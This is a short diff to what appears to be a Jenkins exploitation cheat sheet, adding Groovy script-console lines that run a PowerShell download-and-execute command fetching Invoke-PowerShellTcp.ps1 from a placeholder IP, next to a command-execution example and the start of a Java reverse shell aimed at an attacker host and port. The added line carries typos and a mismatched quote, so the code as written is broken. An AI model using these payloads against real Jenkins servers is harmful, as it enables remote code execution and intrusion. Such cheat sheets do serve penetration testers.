@@ -41,6 +41,9 @@ An open-source automation server written in Java that helps developers build and
   // Windows
   def cmd = "cmd.exe /c dir".execute();
   println("${cmd.text}");
+  // Powershell command
+  cmd = """ powershell "IEX(New-Object Net.WebClient).downlaodString(http://&#x3C;IP>/Invoke-PowerShellTcp.ps1')" """
+  println cmd.execute().text
   // Alternate Java Reverse Shell
   String host="&#x3C;Attacker-IP>";
   int port=&#x3C;Port>;
